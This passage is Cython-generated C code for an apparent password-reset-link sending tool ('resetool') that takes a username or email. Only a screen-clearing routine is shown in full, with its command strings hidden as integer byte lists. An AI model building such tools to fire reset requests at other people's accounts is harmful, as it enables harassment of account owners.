#define __Pyx_PyErr_ExceptionMatches(err) __Pyx_PyErr_ExceptionMatchesInState(__pyx_tstate, err)
static CYTHON_INLINE int __Pyx_PyErr_ExceptionMatchesInState(PyThreadState* tstate, PyObject* err);
#else
#define __Pyx_PyErr_ExceptionMatches(err)  PyErr_ExceptionMatches(err)
#endif

/* GetException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_GetException(type, value, tb)  __Pyx__GetException(__pyx_tstate, type, value, tb)
static int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#else
static int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb);
#endif

/* PyErrFetchRestore.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)
#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))
#else
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#endif
#else
#define __Pyx_PyErr_Clear() PyErr_Clear()
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)
#endif

/* SwapException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_ExceptionSwap(type, value, tb)  __Pyx__ExceptionSwap(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionSwap(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#else
static CYTHON_INLINE void __Pyx_ExceptionSwap(PyObject **type, PyObject **value, PyObject **tb);
#endif

/* PyDictContains.proto */
static CYTHON_INLINE int __Pyx_PyDict_ContainsTF(PyObject* item, PyObject* dict, int eq) {
    int result = PyDict_Contains(dict, item);
    return unlikely(result < 0) ? result : (result == (eq == Py_EQ));
}

/* None.proto */
static CYTHON_INLINE void __Pyx_RaiseUnboundLocalError(const char *varname);

/* Import.proto */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level);

/* ImportFrom.proto */
static PyObject* __Pyx_ImportFrom(PyObject* module, PyObject* name);

/* FetchCommonType.proto */
static PyTypeObject* __Pyx_FetchCommonType(PyTypeObject* type);

/* CythonFunctionShared.proto */
#define __Pyx_CyFunction_USED 1
#define __Pyx_CYFUNCTION_STATICMETHOD  0x01
#define __Pyx_CYFUNCTION_CLASSMETHOD   0x02
#define __Pyx_CYFUNCTION_CCLASS        0x04
#define __Pyx_CyFunction_GetClosure(f)\
    (((__pyx_CyFunctionObject *) (f))->func_closure)
#define __Pyx_CyFunction_GetClassObj(f)\
    (((__pyx_CyFunctionObject *) (f))->func_classobj)
#define __Pyx_CyFunction_Defaults(type, f)\
    ((type *)(((__pyx_CyFunctionObject *) (f))->defaults))
#define __Pyx_CyFunction_SetDefaultsGetter(f, g)\
    ((__pyx_CyFunctionObject *) (f))->defaults_getter = (g)
typedef struct {
    PyCFunctionObject func;
#if PY_VERSION_HEX < 0x030500A0
    PyObject *func_weakreflist;
#endif
    PyObject *func_dict;
    PyObject *func_name;
    PyObject *func_qualname;
    PyObject *func_doc;
    PyObject *func_globals;
    PyObject *func_code;
    PyObject *func_closure;
    PyObject *func_classobj;
    void *defaults;
    int defaults_pyobjects;
    size_t defaults_size;  // used by FusedFunction for copying defaults
    int flags;
    PyObject *defaults_tuple;
    PyObject *defaults_kwdict;
    PyObject *(*defaults_getter)(PyObject *);
    PyObject *func_annotations;
} __pyx_CyFunctionObject;
static PyTypeObject *__pyx_CyFunctionType = 0;
#define __Pyx_CyFunction_Check(obj)  (__Pyx_TypeCheck(obj, __pyx_CyFunctionType))
static PyObject *__Pyx_CyFunction_Init(__pyx_CyFunctionObject* op, PyMethodDef *ml,
                                      int flags, PyObject* qualname,
                                      PyObject *self,
                                      PyObject *module, PyObject *globals,
                                      PyObject* code);
static CYTHON_INLINE void *__Pyx_CyFunction_InitDefaults(PyObject *m,
                                                         size_t size,
                                                         int pyobjects);
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject *m,
                                                            PyObject *tuple);
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsKwDict(PyObject *m,
                                                             PyObject *dict);
static CYTHON_INLINE void __Pyx_CyFunction_SetAnnotationsDict(PyObject *m,
                                                              PyObject *dict);
static int __pyx_CyFunction_init(void);

/* CythonFunction.proto */
static PyObject *__Pyx_CyFunction_New(PyMethodDef *ml,
                                      int flags, PyObject* qualname,
                                      PyObject *closure,
                                      PyObject *module, PyObject *globals,
                                      PyObject* code);

/* SetNameInClass.proto */
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1
#define __Pyx_SetNameInClass(ns, name, value)\
    (likely(PyDict_CheckExact(ns)) ? _PyDict_SetItem_KnownHash(ns, name, value, ((PyASCIIObject *) name)->hash) : PyObject_SetItem(ns, name, value))
#elif CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_SetNameInClass(ns, name, value)\
    (likely(PyDict_CheckExact(ns)) ? PyDict_SetItem(ns, name, value) : PyObject_SetItem(ns, name, value))
#else
#define __Pyx_SetNameInClass(ns, name, value)  PyObject_SetItem(ns, name, value)
#endif

/* CalculateMetaclass.proto */
static PyObject *__Pyx_CalculateMetaclass(PyTypeObject *metaclass, PyObject *bases);

/* Py3ClassCreate.proto */
static PyObject *__Pyx_Py3MetaclassPrepare(PyObject *metaclass, PyObject *bases, PyObject *name, PyObject *qualname,
                                           PyObject *mkw, PyObject *modname, PyObject *doc);
static PyObject *__Pyx_Py3ClassCreate(PyObject *metaclass, PyObject *name, PyObject *bases, PyObject *dict,
                                      PyObject *mkw, int calculate_metaclass, int allow_py2_metaclass);

/* CLineInTraceback.proto */
#ifdef CYTHON_CLINE_IN_TRACEBACK
#define __Pyx_CLineForTraceback(tstate, c_line)  (((CYTHON_CLINE_IN_TRACEBACK)) ? c_line : 0)
#else
static int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line);
#endif

/* CodeObjectCache.proto */
typedef struct {
    PyCodeObject* code_object;
    int code_line;
} __Pyx_CodeObjectCacheEntry;
struct __Pyx_CodeObjectCache {
    int count;
    int max_count;
    __Pyx_CodeObjectCacheEntry* entries;
};
static struct __Pyx_CodeObjectCache __pyx_code_cache = {0,0,NULL};
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line);
static PyCodeObject *__pyx_find_code_object(int code_line);
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object);

/* AddTraceback.proto */
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename);

/* GCCDiagnostics.proto */
#if defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 6))
#define __Pyx_HAS_GCC_DIAGNOSTIC
#endif

/* CIntToPy.proto */
static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value);

/* CIntFromPy.proto */
static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *);

/* CIntFromPy.proto */
static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *);

/* FastTypeChecks.proto */
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_TypeCheck(obj, type) __Pyx_IsSubtype(Py_TYPE(obj), (PyTypeObject *)type)
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject *type);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *type1, PyObject *type2);
#else
#define __Pyx_TypeCheck(obj, type) PyObject_TypeCheck(obj, (PyTypeObject *)type)
#define __Pyx_PyErr_GivenExceptionMatches(err, type) PyErr_GivenExceptionMatches(err, type)
#define __Pyx_PyErr_GivenExceptionMatches2(err, type1, type2) (PyErr_GivenExceptionMatches(err, type1) || PyErr_GivenExceptionMatches(err, type2))
#endif
#define __Pyx_PyException_Check(obj) __Pyx_TypeCheck(obj, PyExc_Exception)

/* CheckBinaryVersion.proto */
static int __Pyx_check_binary_version(void);

/* InitStrings.proto */
static int __Pyx_InitStrings(__Pyx_StringTabEntry *t);


/* Module declarations from 'source' */
#define __Pyx_MODULE_NAME "source"
extern int __pyx_module_is_main_source;
int __pyx_module_is_main_source = 0;

/* Implementation of 'source' */
static PyObject *__pyx_builtin_print;
static PyObject *__pyx_builtin_input;
static const char __pyx_k_[] = "\343\205\244\343\205\244\343\205\244\343\205\244\343\205\244\343\205\244\343\205\244\343\205\244\343\205\244\343\205\244";
static const char __pyx_k_R[] = "R";
static const char __pyx_k_e[] = "e";
static const char __pyx_k__2[] = "\360\235\220\223\341\264\217\341\264\217\312\237 \360\235\220\201\312\217 \360\235\220\203\341\264\240\341\264\215\312\231 \342\200\242 | \342\200\242 \360\235\220\202\312\234\341\264\200\311\264\311\264\341\264\207\312\237 - @\341\264\205\341\264\240\341\264\215\312\231\341\264\230\312\217 ";
static const char __pyx_k__3[] = "\360\235\220\213\311\252\311\264\341\264\213 \360\235\220\222\341\264\207\311\264\341\264\233, \360\235\220\202\312\234\341\264\207\341\264\204\341\264\213 \360\235\220\210\311\264\312\231\341\264\217\360\235\232\207 ";
static const char __pyx_k__4[] = "\360\235\220\205\341\264\200\311\252\312\237\341\264\207\341\264\205 \360\235\220\223\341\264\217 \360\235\220\222\341\264\207\311\264\341\264\205 \360\235\220\223\312\234\341\264\207 \360\235\220\213\311\252\311\264\341\264\213, \360\235\220\223\312\200\312\217 \360\235\220\200\311\242\341\264\200\311\252\311\264 \360\235\220\213\341\264\200\341\264\233\341\264\207\312\200.";
static const char __pyx_k_go[] = "go";
static const char __pyx_k_os[] = "os";
static const char __pyx_k_doc[] = "__doc__";
static const char __pyx_k_get[] = "get";
static const char __pyx_k_red[] = "red";
static const char __pyx_k_url[] = "url";
static const char __pyx_k_data[] = "data";
static const char __pyx_k_init[] = "__init__";
static const char __pyx_k_json[] = "json";
static const char __pyx_k_main[] = "__main__";
static const char __pyx_k_name[] = "name";
static const char __pyx_k_post[] = "post";
static const char __pyx_k_self[] = "self";
static const char __pyx_k_test[] = "__test__";
static const char __pyx_k_time[] = "time";
static const char __pyx_k_1_95m[] = "\033[1;95m \343\205\244\342\246\277 \360\235\220\226\341\264\217\341\264\234\312\237\341\264\205 \360\235\220\230\341\264\217\341\264\234 \360\235\220\213\311\252\341\264\213\341\264\207 \360\235\220\223\341\264\217 \360\235\220\222\341\264\207\311\264\341\264\205 \360\235\220\200\311\264\341\264\217\341\264\233\312\234\341\264\207\312\200 \360\235\220\213\311\252\311\264\341\264\213 \077\077";
static const char __pyx_k_3_36m[] = " \343\205\244\342\246\277 \342\236\241 \033[3;36m ";
static const char __pyx_k_align[] = "align";
static const char __pyx_k_email[] = "email";
static const char __pyx_k_green[] = "green";
static const char __pyx_k_input[] = "input";
static const char __pyx_k_lower[] = "lower";
static const char __pyx_k_print[] = "print";
static const char __pyx_k_sleep[] = "sleep";
static const char __pyx_k_textt[] = "textt";
static const char __pyx_k_1_909m[] = "\033[1;909m \343\205\244\342\246\277 \360\235\220\222\341\264\233\341\264\200\341\264\233\341\264\234\360\235\232\202 \342\236\241 ";
static const char __pyx_k_banner[] = "banner";
static const char __pyx_k_bgcyan[] = "bgcyan";
static const char __pyx_k_cfonts[] = "cfonts";
static const char __pyx_k_colors[] = "colors";
static const char __pyx_k_import[] = "__import__";
static const char __pyx_k_module[] = "__module__";
static const char __pyx_k_name_2[] = "__name__";
static const char __pyx_k_render[] = "render";
static const char __pyx_k_source[] = "source";
static const char __pyx_k_system[] = "system";
static const char __pyx_k_headers[] = "headers";
static const char __pyx_k_prepare[] = "__prepare__";
static const char __pyx_k_refresh[] = "refresh";
static const char __pyx_k_1_909m_2[] = "\033[1;909m \343\205\244\342\246\277 \360\235\220\204\311\264\341\264\233\341\264\207\312\200 \360\235\220\223\312\234\341\264\207 \360\235\220\224\360\235\232\202\341\264\207\312\200\311\264\341\264\200\341\264\215\341\264\207 \360\235\220\226\311\252\341\264\233\312\234\341\264\217\341\264\234\341\264\233 [ @ ] \360\235\220\216\312\200 \360\235\220\214\341\264\200\311\252\312\237 \360\235\220\200\341\264\233\341\264\233\341\264\200\341\264\204\312\234\341\264\207\341\264\205 \360\235\220\201\341\264\207\312\237\341\264\217\341\264\241 \342\217\216";
static const char __pyx_k_1_909m_5[] = "\033[1;909m \343\205\244\342\246\277 \360\235\220\221\341\264\207\322\223\312\200\341\264\207\360\235\232\202\312\234\311\252\311\264\311\242 ...\360\235\220\230\341\264\217\341\264\234 \360\235\220\202\341\264\200\311\264 \360\235\220\221\341\264\207\341\264\233\312\200\312\217 \360\235\220\200\322\223\341\264\233\341\264\207\312\200 5 \360\235\220\222\341\264\207\341\264\204\341\264\217\311\264\341\264\205\360\235\232\202.";
static const char __pyx_k_qualname[] = "__qualname__";
static const char __pyx_k_requests[] = "requests";
static const char __pyx_k_resetool[] = "resetool";
static const char __pyx_k_response[] = "response";
static const char __pyx_k_json_resp[] = "json_resp";
static const char __pyx_k_metaclass[] = "__metaclass__";
static const char __pyx_k_resetdvmb[] = "resetdvmb";
static const char __pyx_k_source_py[] = "source.py";
static const char __pyx_k_background[] = "background";
static const char __pyx_k_LightYellow[] = "LightYellow";
static const char __pyx_k_resetool_go[] = "resetool.go";
static const char __pyx_k_status_text[] = "status_text";
static const char __pyx_k_clear_screen[] = "clear_screen";
static const char __pyx_k_resetool___init[] = "resetool.__init__";
static const char __pyx_k_resetool_banner[] = "resetool.banner";
static const char __pyx_k_cline_in_traceback[] = "cline_in_traceback";
static const char __pyx_k_resetool_resetdvmb[] = "resetool.resetdvmb";
static PyObject *__pyx_n_u_;
static PyObject *__pyx_kp_u_1_909m;
static PyObject *__pyx_kp_u_1_909m_2;
static PyObject *__pyx_kp_u_1_909m_5;
static PyObject *__pyx_kp_u_1_95m;
static PyObject *__pyx_kp_u_3_36m;
static PyObject *__pyx_n_s_LightYellow;
static PyObject *__pyx_n_s_R;
static PyObject *__pyx_kp_u__2;
static PyObject *__pyx_kp_u__3;
static PyObject *__pyx_kp_u__4;
static PyObject *__pyx_n_s_align;
static PyObject *__pyx_n_s_background;
static PyObject *__pyx_n_s_banner;
static PyObject *__pyx_n_s_bgcyan;
static PyObject *__pyx_n_s_cfonts;
static PyObject *__pyx_n_s_clear_screen;
static PyObject *__pyx_n_s_cline_in_traceback;
static PyObject *__pyx_n_s_colors;
static PyObject *__pyx_n_s_data;
static PyObject *__pyx_n_s_doc;
static PyObject *__pyx_n_s_e;
static PyObject *__pyx_n_s_email;
static PyObject *__pyx_n_s_get;
static PyObject *__pyx_n_s_go;
static PyObject *__pyx_n_s_green;
static PyObject *__pyx_n_s_headers;
static PyObject *__pyx_n_s_import;
static PyObject *__pyx_n_s_init;
static PyObject *__pyx_n_s_input;
static PyObject *__pyx_n_s_json;
static PyObject *__pyx_n_s_json_resp;
static PyObject *__pyx_n_s_lower;
static PyObject *__pyx_n_s_main;
static PyObject *__pyx_n_s_metaclass;
static PyObject *__pyx_n_s_module;
static PyObject *__pyx_n_s_name;
static PyObject *__pyx_n_s_name_2;
static PyObject *__pyx_n_s_os;
static PyObject *__pyx_n_s_post;
static PyObject *__pyx_n_s_prepare;
static PyObject *__pyx_n_s_print;
static PyObject *__pyx_n_s_qualname;
static PyObject *__pyx_n_s_red;
static PyObject *__pyx_n_s_refresh;
static PyObject *__pyx_n_s_render;
static PyObject *__pyx_n_s_requests;
static PyObject *__pyx_n_s_resetdvmb;
static PyObject *__pyx_n_s_resetool;
static PyObject *__pyx_n_s_resetool___init;
static PyObject *__pyx_n_s_resetool_banner;
static PyObject *__pyx_n_s_resetool_go;
static PyObject *__pyx_n_s_resetool_resetdvmb;
static PyObject *__pyx_n_s_response;
static PyObject *__pyx_n_s_self;
static PyObject *__pyx_n_s_sleep;
static PyObject *__pyx_n_s_source;
static PyObject *__pyx_kp_s_source_py;
static PyObject *__pyx_n_s_status_text;
static PyObject *__pyx_n_s_system;
static PyObject *__pyx_n_s_test;
static PyObject *__pyx_n_s_textt;
static PyObject *__pyx_n_s_time;
static PyObject *__pyx_n_s_url;
static PyObject *__pyx_pf_6source_clear_screen(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_pf_6source_8resetool___init__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_pf_6source_8resetool_2banner(CYTHON_UNUSED PyObject *__pyx_self, CYTHON_UNUSED PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_pf_6source_8resetool_4resetdvmb(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self, PyObject *__pyx_v_email); /* proto */
static PyObject *__pyx_pf_6source_8resetool_6go(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); /* proto */
static PyObject *__pyx_int_5;
static PyObject *__pyx_int_27;
static PyObject *__pyx_int_32;
static PyObject *__pyx_int_34;
static PyObject *__pyx_int_40;
static PyObject *__pyx_int_41;
static PyObject *__pyx_int_42;
static PyObject *__pyx_int_44;
static PyObject *__pyx_int_45;
static PyObject *__pyx_int_46;
static PyObject *__pyx_int_47;
static PyObject *__pyx_int_48;
static PyObject *__pyx_int_49;
static PyObject *__pyx_int_50;
static PyObject *__pyx_int_51;
static PyObject *__pyx_int_52;
static PyObject *__pyx_int_53;
static PyObject *__pyx_int_54;
static PyObject *__pyx_int_55;
static PyObject *__pyx_int_56;
static PyObject *__pyx_int_57;
static PyObject *__pyx_int_58;
static PyObject *__pyx_int_59;
static PyObject *__pyx_int_61;
static PyObject *__pyx_int_63;
static PyObject *__pyx_int_65;
static PyObject *__pyx_int_66;
static PyObject *__pyx_int_67;
static PyObject *__pyx_int_68;
static PyObject *__pyx_int_69;
static PyObject *__pyx_int_70;
static PyObject *__pyx_int_71;
static PyObject *__pyx_int_72;
static PyObject *__pyx_int_73;
static PyObject *__pyx_int_74;
static PyObject *__pyx_int_75;
static PyObject *__pyx_int_76;
static PyObject *__pyx_int_77;
static PyObject *__pyx_int_78;
static PyObject *__pyx_int_79;
static PyObject *__pyx_int_80;
static PyObject *__pyx_int_82;
static PyObject *__pyx_int_83;
static PyObject *__pyx_int_84;
static PyObject *__pyx_int_85;
static PyObject *__pyx_int_86;
static PyObject *__pyx_int_87;
static PyObject *__pyx_int_88;
static PyObject *__pyx_int_89;
static PyObject *__pyx_int_90;
static PyObject *__pyx_int_91;
static PyObject *__pyx_int_95;
static PyObject *__pyx_int_97;
static PyObject *__pyx_int_98;
static PyObject *__pyx_int_99;
static PyObject *__pyx_int_100;
static PyObject *__pyx_int_101;
static PyObject *__pyx_int_102;
static PyObject *__pyx_int_103;
static PyObject *__pyx_int_104;
static PyObject *__pyx_int_105;
static PyObject *__pyx_int_106;
static PyObject *__pyx_int_107;
static PyObject *__pyx_int_108;
static PyObject *__pyx_int_109;
static PyObject *__pyx_int_110;
static PyObject *__pyx_int_111;
static PyObject *__pyx_int_112;
static PyObject *__pyx_int_113;
static PyObject *__pyx_int_114;
static PyObject *__pyx_int_115;
static PyObject *__pyx_int_116;
static PyObject *__pyx_int_117;
static PyObject *__pyx_int_118;
static PyObject *__pyx_int_119;
static PyObject *__pyx_int_120;
static PyObject *__pyx_int_121;
static PyObject *__pyx_int_122;
static PyObject *__pyx_tuple__5;
static PyObject *__pyx_tuple__7;
static PyObject *__pyx_tuple__9;
static PyObject *__pyx_tuple__11;
static PyObject *__pyx_tuple__13;
static PyObject *__pyx_codeobj__6;
static PyObject *__pyx_codeobj__8;
static PyObject *__pyx_codeobj__10;
static PyObject *__pyx_codeobj__12;
static PyObject *__pyx_codeobj__14;
/* Late includes */



/* Python wrapper */
static PyObject *__pyx_pw_6source_1clear_screen(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_6source_1clear_screen = {"clear_screen", (PyCFunction)__pyx_pw_6source_1clear_screen, METH_NOARGS, 0};
static PyObject *__pyx_pw_6source_1clear_screen(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("clear_screen (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_clear_screen(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_clear_screen(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  int __pyx_t_7;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("clear_screen", 0);

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_system); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_os); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_name); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = PyList_New(2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_4, 0, __pyx_int_110);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_4, 1, __pyx_int_116);
  __pyx_t_6 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_decode_bytes(__pyx_t_6, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_6 = PyObject_RichCompare(__pyx_t_5, __pyx_t_4, Py_EQ); __Pyx_XGOTREF(__pyx_t_6); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_7 = __Pyx_PyObject_IsTrue(__pyx_t_6); if (unlikely(__pyx_t_7 < 0)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  if (__pyx_t_7) {
    __pyx_t_6 = PyList_New(3); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 19, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_INCREF(__pyx_int_99);
    __Pyx_GIVEREF(__pyx_int_99);
    PyList_SET_ITEM(__pyx_t_6, 0, __pyx_int_99);
    __Pyx_INCREF(__pyx_int_108);
    __Pyx_GIVEREF(__pyx_int_108);
    PyList_SET_ITEM(__pyx_t_6, 1, __pyx_int_108);
    __Pyx_INCREF(__pyx_int_115);
    __Pyx_GIVEREF(__pyx_int_115);
    PyList_SET_ITEM(__pyx_t_6, 2, __pyx_int_115);
    __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 19, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_t_6 = __Pyx_decode_bytes(__pyx_t_4, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 19, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_2 = __pyx_t_6;
    __pyx_t_6 = 0;
  } else {
    __pyx_t_6 = PyList_New(5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 19, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_INCREF(__pyx_int_99);
    __Pyx_GIVEREF(__pyx_int_99);
    PyList_SET_ITEM(__pyx_t_6, 0, __pyx_int_99);
    __Pyx_INCREF(__pyx_int_108);
    __Pyx_GIVEREF(__pyx_int_108);
    PyList_SET_ITEM(__pyx_t_6, 1, __pyx_int_108);
    __Pyx_INCREF(__pyx_int_101);
    __Pyx_GIVEREF(__pyx_int_101);
    PyList_SET_ITEM(__pyx_t_6, 2, __pyx_int_101);
    __Pyx_INCREF(__pyx_int_97);
    __Pyx_GIVEREF(__pyx_int_97);
    PyList_SET_ITEM(__pyx_t_6, 3, __pyx_int_97);
    __Pyx_INCREF(__pyx_int_114);
    __Pyx_GIVEREF(__pyx_int_114);
    PyList_SET_ITEM(__pyx_t_6, 4, __pyx_int_114);
    __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 19, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_t_6 = __Pyx_decode_bytes(__pyx_t_4, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 19, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_2 = __pyx_t_6;
    __pyx_t_6 = 0;
  }
  __pyx_t_6 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_6)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_6);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_1 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_6, __pyx_t_2) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_2);
  __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_AddTraceback("source.clear_screen", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
